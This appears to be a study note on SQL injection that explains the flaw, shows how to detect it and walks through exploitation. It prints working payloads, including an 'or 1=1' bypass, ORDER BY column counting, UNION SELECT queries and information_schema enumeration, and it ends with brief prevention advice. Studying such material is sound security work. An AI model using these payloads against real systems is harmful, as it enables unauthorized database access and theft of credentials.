## Notes

### What it is

**SQL Injection** is a type of injection attack where SQL queries are executed using unsanitized user input. When user-controlled data is inserted directly into a database query without proper validation or encoding, it becomes possible for an attacker to manipulate the logic of that query, leading to unauthorized data access, data modification, or even full database compromise.

Because SQL Injection exploits flaws in input handling, it often opens the door to other types of injections as well, such as command injection, stored XSS, or even file inclusion.

### How to identify it

To test for a **SQL Injection** vulnerability, begin by injecting common payloads into fields that likely interact with the database, such as **search bars**, **login forms**, or **URL parameters**.

Using:

```bash
' or 1=1; --
```

…in a search or query field may bypass filtering and return **all records** in the database.

```bash
<h1>Comments for post <?= $post_name ?></h1>
<p>Comment 1</p>
<p>Comment 2</p>
<p>Comment 3</p>
<p>Comment 4</p>
<p>Comment 5</p>
...
```

If the application returns all content instead of filtering based on expected criteria, SQL Injection is likely present.

### How to exploit it

Once a SQL Injection vulnerability is confirmed, an attacker may attempt to extract data from **other tables** in the database, not just the one being queried.

A common approach starts with discovering how many columns are returned by the query. This can be done using `ORDER BY`:

```sql
' ORDER BY 1; --
' ORDER BY 2; --
...
```

When the query breaks or stops returning results, the last working number indicates the number of columns.

With that, the attacker can attempt **UNION-based injection** to append their own query:

```sql
' UNION SELECT 1, 2, 3, ..., n; --
```

If successful, the attacker can start fetching useful data:

```sql
' UNION SELECT database(), user(), @@version, ..., n; --
```

To explore the database structure, the attacker can query **information_schema**, a special metadata database that contains information about all databases and tables.

Listing table names:

```sql
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = "database_name"; -- 
```

Listing table columns:

```sql
' union select column_name from information_schema.columns where table_name = "table_name"; --
```

At this point, the attacker can enumerate every column in every table and exfiltrate sensitive data — including credentials, internal logs, or application secrets — especially if they are stored without encryption or hashing.

## Summary

SQL Injection is a vulnerability that allows attackers to manipulate database queries through unsanitized user input. It is characterized by its ability to alter the structure and logic of SQL statements, which can lead to unauthorized data access, data leakage, or full control over the database. Once exploited, SQLi enables attackers to enumerate the entire database structure, extract sensitive information, and potentially chain into deeper attacks such as privilege escalation or remote code execution. Preventing SQL Injection requires strict input validation, the use of parameterized queries, and proper separation between application logic and user data.
